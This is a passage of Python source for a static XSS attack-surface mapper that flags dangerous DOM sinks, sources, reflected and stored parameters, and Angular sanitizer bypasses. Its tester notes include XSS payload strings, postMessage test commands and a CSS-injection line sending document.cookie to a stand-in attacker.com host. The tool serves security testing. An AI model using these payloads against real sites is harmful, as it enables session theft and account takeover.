"""
XssMapper - XSS attack surface identification (reflected, stored, DOM-based).
Pure static analysis of endpoints and JS content. Zero HTTP requests.
"""
from typing import List, Dict, Set
from .base import BaseSurfaceMapper
from ..models import SurfaceResult, AttackCategory, ConfidenceLevel
from ..evidence import Evidence, EvidenceType
from ...storage.models import ScanResult, Endpoint, JSFile

# ─── DOM SINKS ───────────────────────────────────────────────────────────────

# Strong sinks - directly write HTML/JS, any user input = XSS
_STRONG_SINKS = [
    "innerHTML",
    "outerHTML",
    "document.write(",
    "document.writeln(",
    "insertAdjacentHTML(",
    "eval(",
    "Function(",
    "setTimeout(",       # only dangerous when first arg is a string, not a fn
    "setInterval(",      # same
    ".html(",            # jQuery .html() - matches $(...).html( in minified code
    ".append(",          # jQuery .append() - can inject HTML nodes
    ".prepend(",
    ".after(",
    ".before(",
    "dangerouslySetInnerHTML",   # React
    "v-html",                    # Vue
    "[innerHTML]",               # Angular template binding
    "__html",                    # React shorthand for dangerouslySetInnerHTML
    "{@html ",                   # Svelte raw HTML rendering (note: space after to avoid false matches)
    "x-html=",                   # Alpine.js raw HTML directive
    ":innerHTML",                # Alpine.js property binding shorthand for innerHTML
]

# Navigation sinks - can be exploited with javascript: URIs
_NAVIGATION_SINKS = [
    "location.href =",
    "location.assign(",
    "location.replace(",
    "window.open(",
    "document.location =",
    "location =",
]

# Weak sinks - only dangerous when string-typed user input flows in
_WEAK_SINKS = [
    "postMessage(",      # can be a source OR a sink depending on context
    "document.domain =",
    "document.cookie",   # exfil context, not XSS trigger
]

_ALL_SINKS = _STRONG_SINKS + _NAVIGATION_SINKS + _WEAK_SINKS

# ─── DOM SOURCES ─────────────────────────────────────────────────────────────

# Direct attacker-controlled sources
_DOM_SOURCES = [
    "location.search",
    "location.hash",
    "location.href",
    "location.pathname",
    "document.referrer",
    "document.URL",
    "document.documentURI",
    "document.baseURI",
    "window.name",
    "postMessage",
    "URLSearchParams",
    "decodeURIComponent(location",
    "getParameter(",
    "searchParams.get(",
    "new URL(",
    "location.search.slice(",
    "location.search.substring(",
    "location.search.replace(",
    "params.get(",
    "qs.parse(",                           # common query string lib
    # Angular router sources
    "queryParamMap.get(",
    "paramMap.get(",
    "snapshot.queryParams",
    "snapshot.params",
    "snapshot.fragment",
    "activatedRoute.snapshot",
    # Alpine.js sources - user-influenced data flowing through Alpine stores/router
    "$store.",
    "Alpine.store(",
    "$router.query",
    "$el.innerHTML",
    # SvelteKit sources - $page store is the primary URL data source
    "$page.url.searchParams",
    "$page.params",
    "$page.url.hash",
    "page.url.searchParams",
    "page.params.",
]

# ─── REFLECTED XSS PARAMS ────────────────────────────────────────────────────

# High-signal: these param names are almost always reflected in the response
_REFLECTED_HIGH_PARAMS = {
    "search", "query", "q", "keyword", "term", "s", "find",
    "error", "msg", "message", "notice", "alert", "warn",    # error/notice reflection
    "callback", "jsonp", "cb",                                # JSONP callbacks
    "next", "redirect", "return_url",                         # value often echoed in page
}

# Medium-signal: commonly reflected but less certain
_REFLECTED_MEDIUM_PARAMS = {
    "text", "input", "value", "name", "username", "email",
    "title", "label", "description", "comment",
    "ref", "referrer", "source", "from",
    "page", "tab", "view", "section", "lang", "locale",
    "format", "type", "mode", "action",
    "filter", "sort", "order", "category",
}

# Low-signal: any query param can reflect - catch everything else
# These won't be flagged individually but we sweep all params with context

_ALL_REFLECTED_PARAMS = _REFLECTED_HIGH_PARAMS | _REFLECTED_MEDIUM_PARAMS

# ─── STORED XSS FIELDS ───────────────────────────────────────────────────────

# Body field names that imply content gets stored and displayed to other users
_STORED_HIGH_FIELDS = {
    "comment", "message", "content", "body", "text", "note",
    "description", "bio", "about", "summary", "review", "feedback",
    "title", "subject", "caption", "post", "reply", "response",
    "announcement", "update", "news",
}

# Field names that may be stored and displayed but with less certainty
_STORED_MEDIUM_FIELDS = {
    "name", "username", "display_name", "first_name", "last_name",
    "address", "location", "website", "url", "link",
    "label", "tag", "category", "reason", "notes",
}

# ─── ANGULAR SECURITY BYPASS SINKS ──────────────────────────────────────────
#
# Angular's DomSanitizer.bypassSecurityTrust*() family explicitly disables
# Angular's built-in sanitization for a specific context. Finding these in
# compiled/minified bundles is HIGH confidence - the dev consciously bypassed
# the security layer and the only question is whether the input is user-controlled.
#
# Each method covers a different injection context with different payloads:
#
#   bypassSecurityTrustHtml()     - raw HTML injected into [innerHTML] binding
#                                   → XSS via <script>, <img onerror>, etc.
#   bypassSecurityTrustScript()   - raw JS injected into <script> src or content
#                                   → direct script execution
#   bypassSecurityTrustUrl()      - raw URL used in href/src attributes
#                                   → javascript: URI → XSS, or open redirect
#   bypassSecurityTrustResourceUrl() - raw URL for external resources (script src,
#                                   iframe src, link href)
#                                   → CSP bypass, script injection from attacker host
#   bypassSecurityTrustStyle()    - raw CSS injected into [style] binding
#                                   → CSS injection, expression() in IE, data exfil
#   bypassSecurityTrustSanitizer() - bypasses the sanitizer pipe entirely
#                                   → catch-all, treat as HTML bypass
#
# In minified Angular bundles these are mangled (e.g. t.bypassSecurityTrustHtml)
# but the method name suffix is always preserved by the Angular compiler because
# it's part of the DomSanitizer public API contract.

_ANGULAR_BYPASS_SINKS = {
    # method_suffix: (surface_label, risk_description, payload_hint, confidence)
    "bypassSecurityTrustHtml": (
        "Angular bypassSecurityTrustHtml",
        "Disables HTML sanitization - raw HTML injected into [innerHTML] or similar binding. "
        "Any user-controlled input reaching this → XSS.",
        "HIGH",
    ),
    "bypassSecurityTrustScript": (
        "Angular bypassSecurityTrustScript",
        "Disables script sanitization - value used as raw JS content or script src. "
        "User-controlled input → direct script execution.",
        "HIGH",
    ),
    "bypassSecurityTrustUrl": (
        "Angular bypassSecurityTrustUrl",
        "Disables URL sanitization - value used in href/src attributes without validation. "
        "Enables javascript: URI XSS and open redirect.",
        "HIGH",
    ),
    "bypassSecurityTrustResourceUrl": (
        "Angular bypassSecurityTrustResourceUrl",
        "Disables resource URL sanitization - value used as external resource URL "
        "(script src, iframe src, link href). Attacker-controlled URL → CSP bypass, "
        "script injection from attacker-controlled host.",
        "HIGH",
    ),
    "bypassSecurityTrustStyle": (
        "Angular bypassSecurityTrustStyle",
        "Disables CSS sanitization - value injected into [style] binding without filtering. "
        "Enables CSS injection for data exfiltration via url() or expression() in legacy IE.",
        "MEDIUM",
    ),
    "bypassSecurityTrustSanitizer": (
        "Angular bypassSecurityTrustSanitizer",
        "Bypasses the Angular sanitizer pipe entirely. Treat as HTML bypass - "
        "any user-controlled input reaching this is a direct XSS vector.",
        "HIGH",
    ),
}

# Angular sanitization suppressor patterns - these mark a component as
# explicitly opting out of Angular's built-in HTML sanitization via
# the SECURITY_SCHEMA or custom sanitization config.
_ANGULAR_SANITIZER_SUPPRESSOR_PATTERNS = [
    "SecurityContext.NONE",            # DomSanitizer.sanitize(SecurityContext.NONE, ...)
    "allowedSanitizedProperties",      # custom schema that widens allowed attrs
    "CUSTOM_ELEMENTS_SCHEMA",          # disables unknown element/attr warnings, loosens sanitization
    "NO_ERRORS_SCHEMA",                # disables all schema checking
]

# Angular template expressions that directly set DOM properties bypassing
# sanitization in property binding contexts
_ANGULAR_TEMPLATE_SINK_PATTERNS = [
    "[innerHTML]",          # already in _STRONG_SINKS but calling out explicitly
    "[outerHTML]",
    "[href]",               # property binding on href - differs from attr binding
    "[src]",                # property binding on src
    "[action]",             # form action
    "bind-innerHTML",       # verbose binding syntax
    "bind-href",
    "(click)=\"eval",       # event binding calling eval
]

# Angular-specific DOM sources: ActivatedRoute, Router events, query params
_ANGULAR_SOURCES = [
    "activatedRoute.snapshot.queryParams",
    "activatedRoute.snapshot.params",
    "activatedRoute.queryParams",
    "activatedRoute.params",
    "route.snapshot.queryParams",
    "route.snapshot.params",
    "router.parseUrl(",
    "NavigationExtras",
    "ActivatedRoute",
    "queryParamMap.get(",
    "paramMap.get(",
    "snapshot.fragment",
]

_BURP_NOTES_ANGULAR_BYPASS_HTML = (
    "Angular bypassSecurityTrustHtml detected - Angular's XSS protection explicitly disabled. "
    "Trace DomSanitizer.bypassSecurityTrustHtml() call back to its input. "
    "If any part is user-controlled (route param, query param, API response field), it's XSS. "
    "Payloads: <img src=x onerror=alert(document.domain)>, <svg onload=alert(1)>. "
    "Search bundle for 'bypassSecurityTrustHtml' and review every call site."
)

_BURP_NOTES_ANGULAR_BYPASS_SCRIPT = (
    "Angular bypassSecurityTrustScript detected - script sanitization disabled. "
    "Any user-controlled value reaching this executes as JavaScript. "
    "Trace the call site back to route params, API data, or localStorage. "
    "This is typically HIGH severity if exploitable."
)

_BURP_NOTES_ANGULAR_BYPASS_URL = (
    "Angular bypassSecurityTrustUrl detected - href/src URL sanitization disabled. "
    "Test: inject javascript:alert(document.domain) as a URL value. "
    "Also test data: URIs. If the value flows from a query param or route segment, "
    "it's exploitable for XSS via javascript: scheme."
)

_BURP_NOTES_ANGULAR_BYPASS_RESOURCE_URL = (
    "Angular bypassSecurityTrustResourceUrl detected - external resource URL sanitization disabled. "
    "Value is used as script src, iframe src, or link href without validation. "
    "If user-controlled: host a payload JS file and inject its URL to load arbitrary scripts. "
    "This bypasses CSP if the policy uses 'unsafe-inline' or if the app trusts attacker domains."
)

_BURP_NOTES_ANGULAR_BYPASS_STYLE = (
    "Angular bypassSecurityTrustStyle detected - CSS sanitization disabled. "
    "Test CSS injection: inject } body{background:url(http://attacker.com/?c=document.cookie)} { "
    "In legacy IE: expression(alert(1)). "
    "Even without XSS, CSS injection enables UI redressing and data exfiltration via url()."
)

_BURP_NOTES_ANGULAR_SANITIZER_SUPPRESSOR = (
    "Angular sanitization suppressor detected (SecurityContext.NONE or custom schema). "
    "The app has explicitly disabled or weakened Angular's built-in sanitization. "
    "Audit [innerHTML] bindings and bypassSecurityTrust* calls in the same component. "
    "Any user-controlled value flowing into an [innerHTML] binding is XSS."
)

# ─── POSTMESSAGE PATTERNS ────────────────────────────────────────────────────

# Patterns that indicate a postMessage listener is registered
_POSTMESSAGE_LISTENER_PATTERNS = [
    "addEventListener(\"message\"",
    "addEventListener('message'",
    ".onmessage =",
    ".onmessage=",
]

# Patterns that indicate the handler performs an origin check
_ORIGIN_CHECK_PATTERNS = [
    "event.origin",
    "e.origin",
    "message.origin",
    "ev.origin",
    "msg.origin",
    "data.origin",
]

# ─── BURP NOTES ──────────────────────────────────────────────────────────────

_BURP_NOTES_REFLECTED = (
    "Reflected XSS surface. Check if the param value appears in the HTML response unsanitized. "
    "Payloads: <script>alert(1)</script>, \"><img src=x onerror=alert(1)>, "
    "javascript:alert(1) (for href/src contexts). "
    "Use Burp's active scan or manually fuzz with a unique string first to confirm reflection."
)

_BURP_NOTES_REFLECTED_JSONP = (
    "JSONP callback parameter - classic XSS vector. "
    "Test: ?callback=<script>alert(1)</script> and ?callback=alert. "
    "If the response wraps your value in a function call without sanitization, it's exploitable. "
    "Content-Type should be application/json but often isn't for JSONP."
)

_BURP_NOTES_STORED = (
    "Stored XSS surface. Input may be persisted and rendered for other users. "
    "Submit <img src=x onerror=alert(document.domain)> and browse to where the content displays. "
    "Check admin panels, dashboards, user profiles - anywhere the data could be rendered. "
    "Use a Burp Collaborator payload to detect blind stored XSS."
)

_BURP_NOTES_DOM_SURFACE = (
    "DOM source flows into a dangerous sink - plausible XSS data flow. "
    "Open in browser, DevTools -> Sources, set breakpoint on the sink. "
    "Test location.hash payloads first (no server round-trip): #<img src=x onerror=alert(1)>. "
    "Then test location.search params. Trace the full data flow before claiming exploitable."
)

_BURP_NOTES_DOM_SINK = (
    "DOM sink observed with no confirmed user-controlled source in the same file. "
    "Verify manually: trace all inputs into this sink. "
    "The source may arrive via postMessage, an AJAX response, or a variable set elsewhere. "
    "Not exploitable until a user-controlled path to this sink is confirmed."
)

_BURP_NOTES_REACT = (
    "dangerouslySetInnerHTML detected - React's explicit XSS escape hatch. "
    "Trace what value feeds __html. If it includes any user-controlled data without DOMPurify or similar, it's XSS. "
    "Search the codebase for dangerouslySetInnerHTML and review each usage."
)

_BURP_NOTES_VUE = (
    "v-html directive detected - Vue's equivalent of innerHTML, bypasses Vue's XSS protections. "
    "Trace the bound variable back to its source. If any part is user-controlled, test XSS. "
    "Payload: <img src=x onerror=alert(1)>"
)

_BURP_NOTES_JQUERY = (
    "jQuery HTML-injection sink detected (.html(), .append(), etc.). "
    "Very common XSS vector in older apps. Trace what value is passed in. "
    "If any user input reaches this, test: $.html('<img src=x onerror=alert(1)>')"
)

_BURP_NOTES_NAV_SINK = (
    "Navigation sink (location.href, window.open, etc.) with user-controlled source. "
    "Primary risk is open redirect, but javascript: URI injection enables XSS. "
    "Test: ?next=javascript:alert(1), then confirm if href is set without validation."
)

_BURP_NOTES_POSTMESSAGE = (
    "postMessage XSS - no origin check. Open target in browser, open DevTools console, run: "
    "window.postMessage('<img src=x onerror=alert(document.domain)>', '*') and watch for XSS. "
    "Also test: window.postMessage({type:'update', data:'<script>alert(1)<\\/script>'}, '*'). "
    "Check what the handler does with event.data before claiming exploitable."
)

_BURP_NOTES_SVELTE = (
    "Svelte {@html} directive detected - Svelte's explicit XSS escape hatch. "
    "Svelte does NOT sanitize values passed to {@html}; it renders them as raw HTML. "
    "Trace what variable/expression is passed to {@html}. "
    "If any part is user-controlled (URL param, API response, store value), it's XSS. "
    "Payload: {@html '<img src=x onerror=alert(document.domain)>'}. "
    "Search compiled bundle for '{@html' and review every usage - consider DOMPurify wrapping."
)

_BURP_NOTES_ALPINE = (
    "Alpine.js x-html directive detected - Alpine's equivalent of innerHTML, bypasses Alpine's XSS protections. "
    "x-html renders the bound expression as raw HTML with no sanitization. "
    "Trace the expression back to its source: $store, URL params ($router.query), fetch() responses. "
    "If user-controlled: inject <img src=x onerror=alert(document.domain)> as the value. "
    "Also check :innerHTML bindings (Alpine property shorthand) for the same pattern."
)


# ─── HELPERS ─────────────────────────────────────────────────────────────────

def _find_strong_sinks(content: str) -> List[str]:
    return [s for s in _STRONG_SINKS if s in content]

def _find_nav_sinks(content: str) -> List[str]:
    return [s for s in _NAVIGATION_SINKS if s in content]

def _find_js_sinks(content: str) -> List[str]:
    """All JS sinks - strong + navigation combined."""
    return _find_strong_sinks(content) + _find_nav_sinks(content)

def _find_sources(content: str) -> List[str]:
    return [s for s in _DOM_SOURCES if s in content]

def _is_framework_sink(content: str) -> Dict[str, bool]:
    return {
        "react":   "dangerouslySetInnerHTML" in content or "__html" in content,
        "vue":     "v-html" in content,
        "svelte":  "{@html " in content,
        "alpine":  "x-html=" in content or ":innerHTML" in content,
        "jquery":  any(s in content for s in [".html(", ".append(", ".prepend(", ".after(", ".before("]),
        "angular": any(k in content for k in _ANGULAR_BYPASS_SINKS),
    }

def _sink_burp_notes(sinks: List[str], frameworks: Dict[str, bool]) -> str:
    if frameworks.get("react"):
        return _BURP_NOTES_REACT
    if frameworks.get("vue"):
        return _BURP_NOTES_VUE
    if frameworks.get("svelte"):
        return _BURP_NOTES_SVELTE
    if frameworks.get("alpine"):
        return _BURP_NOTES_ALPINE
    if frameworks.get("angular"):
        return _BURP_NOTES_ANGULAR_BYPASS_HTML
    if frameworks.get("jquery"):
        return _BURP_NOTES_JQUERY
    return _BURP_NOTES_DOM_SURFACE

def _detect_angular_bypass(content: str) -> List[Dict]:
    """
    Scan JS content for Angular bypassSecurityTrust* calls.
    Returns a list of dicts with keys: method, label, risk, confidence, burp_notes.
    Each unique method found in the file is returned once.
    """
    found = []
    burp_map = {
        "bypassSecurityTrustHtml":        _BURP_NOTES_ANGULAR_BYPASS_HTML,
        "bypassSecurityTrustScript":      _BURP_NOTES_ANGULAR_BYPASS_SCRIPT,
        "bypassSecurityTrustUrl":         _BURP_NOTES_ANGULAR_BYPASS_URL,
        "bypassSecurityTrustResourceUrl": _BURP_NOTES_ANGULAR_BYPASS_RESOURCE_URL,
        "bypassSecurityTrustStyle":       _BURP_NOTES_ANGULAR_BYPASS_STYLE,
        "bypassSecurityTrustSanitizer":   _BURP_NOTES_ANGULAR_BYPASS_HTML,
    }
    for method, (label, risk, conf) in _ANGULAR_BYPASS_SINKS.items():
        if method in content:
            found.append({
                "method":     method,
                "label":      label,
                "risk":       risk,
                "confidence": conf,
                "burp_notes": burp_map[method],
            })
    return found

def _detect_angular_sources(content: str) -> List[str]:
    """Return Angular-specific user-controlled sources found in content."""
    return [s for s in _ANGULAR_SOURCES if s in content]

def _detect_angular_sanitizer_suppressor(content: str) -> List[str]:
    """Return any sanitization suppressor patterns found in content."""
    return [p for p in _ANGULAR_SANITIZER_SUPPRESSOR_PATTERNS if p in content]

def _has_postmessage_listener(content: str) -> bool:
    return any(p in content for p in _POSTMESSAGE_LISTENER_PATTERNS)

def _has_origin_check(content: str) -> bool:
    return any(p in content for p in _ORIGIN_CHECK_PATTERNS)

# Patterns that indicate event.data is only used in strict equality comparisons
# (e.g. Vue Router / Inertia.js token resolver: `i === G && s === n`)
# In this pattern event.data is deserialized into typed tokens compared by ===,
# not fed into any DOM sink - it's a callback resolver, not an XSS vector.
_POSTMESSAGE_EQUALITY_ONLY_PATTERNS = [
    "event.data ===",
    "event.data!==",
    "e.data ===",
    "e.data!==",
    "data.type ===",
    "data.type!==",
]

_POSTMESSAGE_DOM_ADJACENCY = [
    "innerHTML", "outerHTML", "document.write", "eval(",
    "Function(", "insertAdjacentHTML", ".html(",
    "dangerouslySetInnerHTML", "v-html",
]

def _is_postmessage_equality_resolver(content: str) -> bool:
    """
    Returns True when event.data only appears inside === comparisons with no
    adjacent DOM sink. This is the Vue Router / Inertia.js token-gated callback
    resolver pattern - not an XSS vector.
    """
    has_equality = any(p in content for p in _POSTMESSAGE_EQUALITY_ONLY_PATTERNS)
    has_dom_sink = any(p in content for p in _POSTMESSAGE_DOM_ADJACENCY)
    return has_equality and not has_dom_sink


# ─── MAPPER ──────────────────────────────────────────────────────────────────

class XssMapper(BaseSurfaceMapper):
    category = AttackCategory.XSS

    def map(self, result: ScanResult) -> List[SurfaceResult]:
        # Pre-build JS sink/source index keyed by JS URL for endpoint cross-ref
        js_sink_index: Dict[str, List[str]] = {}
        for js in result.js_files:
            if js.content:
                sinks = _find_strong_sinks(js.content)
                if sinks and js.url:
                    js_sink_index[js.url] = sinks

        # ── 1. REFLECTED XSS - query params ──────────────────────────────────
        for ep in result.endpoints:
            method = (ep.method or "GET").upper()
            path   = (ep.path or ep.url or "").lower()

            for qp in (ep.query_params or []):
                name   = (qp.get("name") or "").lower()
                if not name:
                    continue

                is_high   = name in _REFLECTED_HIGH_PARAMS
                is_medium = name in _REFLECTED_MEDIUM_PARAMS
                is_jsonp  = name in ("callback", "jsonp", "cb")

                evidence   = []
                confidence = ConfidenceLevel.LOW

                if is_jsonp:
                    evidence.append(f"JSONP callback param '{name}' - value echoed as function wrapper")
                    confidence  = ConfidenceLevel.HIGH
                    burp_notes  = _BURP_NOTES_REFLECTED_JSONP
                elif is_high:
                    evidence.append(f"High-signal reflection param '{name}' - commonly echoed in HTML response")
                    confidence  = ConfidenceLevel.MEDIUM
                    burp_notes  = _BURP_NOTES_REFLECTED
                elif is_medium:
                    evidence.append(f"Param '{name}' may appear in rendered response")
                    confidence  = ConfidenceLevel.LOW
                    burp_notes  = _BURP_NOTES_REFLECTED
                else:
                    # Any other query param - flag at LOW, sink in source JS bumps it
                    evidence.append(f"Query param '{name}' is a potential reflection point")
                    confidence  = ConfidenceLevel.LOW
                    burp_notes  = _BURP_NOTES_REFLECTED

                # Cross-reference with JS sinks from the same source file
                source_sinks = js_sink_index.get(ep.source_file or "", [])
                if source_sinks:
                    evidence.append(f"JS sinks in source file: {', '.join(source_sinks[:3])}")
                    if confidence == ConfidenceLevel.LOW:
                        confidence = ConfidenceLevel.MEDIUM
                    elif confidence == ConfidenceLevel.MEDIUM:
                        confidence = ConfidenceLevel.HIGH

                # Auth-gated reflection is higher impact:
                # - An attacker needs a valid session, reducing noise, but
                #   exploitation typically leads to account takeover / stored XSS
                #   pivot rather than just session theft. Flag it clearly.
                auth_ctx = ep.auth_context or ""
                is_authed = auth_ctx and auth_ctx.lower() not in ("", "none")
                if is_authed:
                    evidence.append(
                        f"Auth-gated endpoint ({auth_ctx}) - reflected XSS here enables "
                        "session-context XSS: steal session cookies, CSRF token theft, "
                        "or account takeover via DOM manipulation"
                    )
                    # Bump confidence one level for auth-gated surfaces
                    if confidence == ConfidenceLevel.LOW:
                        confidence = ConfidenceLevel.MEDIUM
                    elif confidence == ConfidenceLevel.MEDIUM:
                        confidence = ConfidenceLevel.HIGH

                self._candidate(
                    endpoint     = ep,
                    surface_type = "Reflected XSS",
                    parameters   = [f"query:{name}"],
                    confidence   = confidence,
                    evidence     = evidence,
                    burp_notes   = burp_notes,
                    auth_context = auth_ctx,
                )
                ev_list = [
                    Evidence(
                        evidence_type = EvidenceType.PARAMETER_SEMANTIC,
                        source        = "static",
                        endpoint      = ep.url or "",
                        method        = method,
                        parameter     = name,
                        context       = (
                            "JSONP callback parameter" if is_jsonp else
                            f"High-signal reflection param '{name}'" if is_high else
                            f"Reflection param '{name}'"
                        ),
                        details       = evidence[0] if evidence else "",
                    ),
                ]
                if source_sinks:
                    ev_list.append(Evidence(
                        evidence_type = EvidenceType.STATIC_JS,
                        source        = "static",
                        asset         = ep.source_file or "",
                        endpoint      = ep.url or "",
                        context       = "JS sinks cross-referenced from source file",
                        details       = ", ".join(source_sinks[:3]),
                    ))
                if is_authed:
                    ev_list.append(Evidence(
                        evidence_type = EvidenceType.METADATA,
                        source        = "static",
                        endpoint      = ep.url or "",
                        method        = method,
                        context       = f"Auth-gated endpoint: {auth_ctx}",
                    ))
                self._emit_evidence(
                    evidence     = ev_list,
                    surface_type = "Reflected XSS",
                    endpoint     = ep.url or "",
                    method       = method,
                    parameter    = name,
                    notes        = burp_notes,
                )

            # ── 2. STORED XSS - POST/PUT/PATCH body fields ───────────────────
            if method in ("POST", "PUT", "PATCH"):
                for bf in (ep.body_fields or []):
                    name = (bf.get("name") or "").lower()
                    if not name:
                        continue

                    is_stored_high   = name in _STORED_HIGH_FIELDS
                    is_stored_medium = name in _STORED_MEDIUM_FIELDS

                    if not (is_stored_high or is_stored_medium):
                        continue  # skip fields that clearly aren't display-facing

                    confidence = ConfidenceLevel.HIGH if is_stored_high else ConfidenceLevel.MEDIUM
                    evidence   = [
                        f"Body field '{name}' on {method} {ep.url}",
                        "Field name implies content is stored and rendered for other users" if is_stored_high
                        else "Field name may be stored and displayed",
                    ]

                    auth_ctx = ep.auth_context or ""
                    is_stored_authed = auth_ctx and auth_ctx.lower() not in ("", "none")
                    if is_stored_authed:
                        evidence.append(
                            f"Auth-gated submission ({auth_ctx}) - stored XSS here targets "
                            "everyone who views this content, including admins"
                        )
                        # Stored XSS on auth-gated input = HIGH regardless of field tier,
                        # because it persists and can hit other authenticated users
                        confidence = ConfidenceLevel.HIGH

                    self._candidate(
                        endpoint     = ep,
                        surface_type = "Stored XSS",
                        parameters   = [f"body:{name}"],
                        confidence   = confidence,
                        evidence     = evidence,
                        burp_notes   = _BURP_NOTES_STORED,
                        auth_context = auth_ctx,
                    )
                    stored_ev = [
                        Evidence(
                            evidence_type = EvidenceType.PARAMETER_SEMANTIC,
                            source        = "static",
                            endpoint      = ep.url or "",
                            method        = method,
                            parameter     = name,
                            context       = (
                                f"High-signal stored field '{name}' - likely rendered for other users"
                                if is_stored_high else
                                f"Medium-signal stored field '{name}' - may be rendered"
                            ),
                            details       = evidence[0] if evidence else "",
                        ),
                    ]
                    if is_stored_authed:
                        stored_ev.append(Evidence(
                            evidence_type = EvidenceType.METADATA,
                            source        = "static",
                            endpoint      = ep.url or "",
                            method        = method,
                            context       = f"Auth-gated submission: {auth_ctx}",
                        ))
                    self._emit_evidence(
                        evidence     = stored_ev,
                        surface_type = "Stored XSS",
                        endpoint     = ep.url or "",
                        method       = method,
                        parameter    = name,
                        notes        = _BURP_NOTES_STORED,
                    )

        # ── 3. DOM XSS - per JS file sink/source analysis ────────────────────
        # Build set of library file URLs so we skip them entirely.
        # Findings in react.development.js, angular.min.js, etc. are not exploitable -
        # the sinks are internal to the library, not reachable from app code.
        _lib_urls: Set[str] = {
            lf.source_file
            for lf in getattr(result, "library_findings", [])
            if lf.source_file
        }

        for js in result.js_files:
            if not js.content:
                continue
            # Skip known library files - internal sinks are not attack surface
            if js.url and js.url in _lib_urls:
                continue
            content = js.content

            strong_sinks = _find_strong_sinks(content)
            nav_sinks    = _find_nav_sinks(content)
            sources      = _find_sources(content)
            frameworks   = _is_framework_sink(content)

            all_sinks    = strong_sinks + nav_sinks

            ep_url = js.url or getattr(js, "source_page", "") or ""
            if not ep_url:
                continue

            from ...storage.models import Endpoint as _Endpoint
            synthetic_ep = _Endpoint(
                url=ep_url,
                path=ep_url,
                method="GET",
                category="",
                source_file=js.url or "",
                line_number=0,
                confidence=0.5,
                query_params=[],
                path_params=[],
                body_fields=[],
                request_headers={},
                auth_context="",
                source_type=getattr(js, "source_type", "static") or "static",
            )

            # ── postMessage XSS - runs on every JS file, independent of sinks ─
            if _has_postmessage_listener(content) and not _has_origin_check(content):
                pm_evidence = [
                    "postMessage listener found: addEventListener(\"message\") or .onmessage handler",
                    "No origin check detected (event.origin not present) - any origin can send messages",
                ]

                # Downgrade to LOW when this looks like a framework token resolver
                # (Vue Router / Inertia.js pattern: event.data only in === comparisons,
                # no DOM sinks adjacent - it's a callback dispatcher, not an XSS sink)
                if _is_postmessage_equality_resolver(content):
                    pm_evidence.append(
                        "event.data only appears in strict equality checks (=== comparisons) "
                        "with no adjacent DOM sink - pattern matches Vue Router / Inertia.js "
                        "token resolver, not a real XSS data flow"
                    )
                    pm_confidence = ConfidenceLevel.LOW
                elif strong_sinks:
                    pm_evidence.append(f"Strong DOM sinks in same file: {', '.join(strong_sinks[:4])}")
                    pm_evidence.append("Attacker can send arbitrary messages from evil.com to this handler")
                    pm_confidence = ConfidenceLevel.HIGH
                else:
                    pm_evidence.append("Attacker can send arbitrary messages from evil.com to this handler")
                    pm_confidence = ConfidenceLevel.MEDIUM

                self._candidate(
                    endpoint     = synthetic_ep,
                    surface_type = "DOM XSS via postMessage",
                    parameters   = [],
                    confidence   = pm_confidence,
                    evidence     = pm_evidence,
                    burp_notes   = _BURP_NOTES_POSTMESSAGE,
                )
                pm_ev = [
                    Evidence(
                        evidence_type = EvidenceType.DOM,
                        source        = "static",
                        asset         = js.url or "",
                        context       = "postMessage listener without origin check",
                        details       = "addEventListener('message') or .onmessage with no event.origin validation",
                    ),
                ]
                if strong_sinks:
                    pm_ev.append(Evidence(
                        evidence_type = EvidenceType.STATIC_JS,
                        source        = "static",
                        asset         = js.url or "",
                        context       = "Strong DOM sinks in same file as postMessage handler",
                        details       = ", ".join(strong_sinks[:4]),
                    ))
                self._emit_evidence(
                    evidence     = pm_ev,
                    surface_type = "DOM XSS via postMessage",
                    endpoint     = ep_url,
                    method       = "GET",
                    parameter    = "event.data",
                    notes        = _BURP_NOTES_POSTMESSAGE,
                )

            # ── Angular bypassSecurityTrust* detection ────────────────────────
            # Each method found gets its own finding because they represent
            # different injection contexts with different payloads and severity.
            angular_bypasses = _detect_angular_bypass(content)
            angular_sources  = _detect_angular_sources(content)
            suppressors      = _detect_angular_sanitizer_suppressor(content)

            for bypass in angular_bypasses:
                conf_str = bypass["confidence"]
                conf     = (ConfidenceLevel.HIGH   if conf_str == "HIGH"
                            else ConfidenceLevel.MEDIUM)

                ang_evidence = [
                    f"Angular security bypass: {bypass['method']}() found in {js.url or ep_url}",
                    bypass["risk"],
                ]

                # Presence of Angular-specific sources (route params, queryParamMap)
                # in the same file is strong evidence of user-controlled input flowing in
                if angular_sources:
                    ang_evidence.append(
                        f"Angular user-controlled sources in same file: "
                        f"{', '.join(angular_sources[:3])}"
                    )
                    # Source + bypass in same file = very high confidence
                    conf = ConfidenceLevel.HIGH

                # Generic DOM sources also count
                if sources:
                    ang_evidence.append(
                        f"Additional DOM sources: {', '.join(sources[:2])}"
                    )
                    conf = ConfidenceLevel.HIGH

                if suppressors:
                    ang_evidence.append(
                        f"Sanitization suppressor also present: {', '.join(suppressors)} "
                        f"- Angular's schema-level protection also weakened"
                    )

                self._candidate(
                    endpoint     = synthetic_ep,
                    surface_type = bypass["label"],
                    parameters   = [],
                    confidence   = conf,
                    evidence     = ang_evidence,
                    burp_notes   = bypass["burp_notes"],
                )
                ang_ev = [
                    Evidence(
                        evidence_type = EvidenceType.AST,
                        source        = "static",
                        asset         = js.url or "",
                        context       = f"Angular security bypass: {bypass['method']}()",
                        details       = bypass["risk"],
                    ),
                ]
                if angular_sources or sources:
                    ang_ev.append(Evidence(
                        evidence_type = EvidenceType.DOM,
                        source        = "static",
                        asset         = js.url or "",
                        context       = "User-controlled Angular/DOM sources in same file",
                        details       = ", ".join((angular_sources + sources)[:4]),
                    ))
                if suppressors:
                    ang_ev.append(Evidence(
                        evidence_type = EvidenceType.AST,
                        source        = "static",
                        asset         = js.url or "",
                        context       = "Sanitization suppressor also present",
                        details       = ", ".join(suppressors),
                    ))
                self._emit_evidence(
                    evidence     = ang_ev,
                    surface_type = bypass["label"],
                    endpoint     = ep_url,
                    method       = "GET",
                    parameter    = bypass["method"],
                    notes        = bypass["burp_notes"],
                )

            # Sanitization suppressor without a bypass call - still worth flagging
            # because any [innerHTML] binding in the same component loses protection
            if suppressors and not angular_bypasses:
                supp_evidence = [
                    f"Angular sanitization suppressor detected in {js.url or ep_url}: "
                    f"{', '.join(suppressors)}",
                    "Angular's built-in sanitization weakened at schema level - "
                    "review all [innerHTML] bindings in this component for user-controlled input",
                ]
                if "[innerHTML]" in content or "[outerHTML]" in content:
                    supp_evidence.append(
                        "Property binding to [innerHTML] or [outerHTML] found in same file - "
                        "sanitization bypass is active at the point of HTML rendering"
                    )
                self._candidate(
                    endpoint     = synthetic_ep,
